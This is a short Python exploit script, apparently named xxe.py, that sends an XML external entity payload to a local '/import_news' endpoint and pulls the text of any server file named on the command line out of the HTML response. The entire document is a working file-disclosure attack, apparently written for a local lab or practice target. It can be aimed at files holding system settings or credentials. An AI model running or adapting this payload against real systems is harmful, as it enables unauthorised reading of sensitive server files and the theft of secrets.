import sys

from bs4 import BeautifulSoup
import requests
import html

payload = \
    """<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file://{}'>]><root>&test;</root>"""
url = "http://localhost:5000/import_news"

def exploit(f):
    print(f)
    r = requests.post(
        "http://127.0.0.1:5000/import_news",
        data={'xml': payload.format(f)}
    )
    if r.status_code != 200:
        print(f"Request error: {r.status_code}")
        exit(1)
    return html.unescape(BeautifulSoup(r.text, "lxml").p.text)[14:-7]

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: xxe.py <filename>")

    filename = sys.argv[1]
    print(
        exploit(filename)
    )

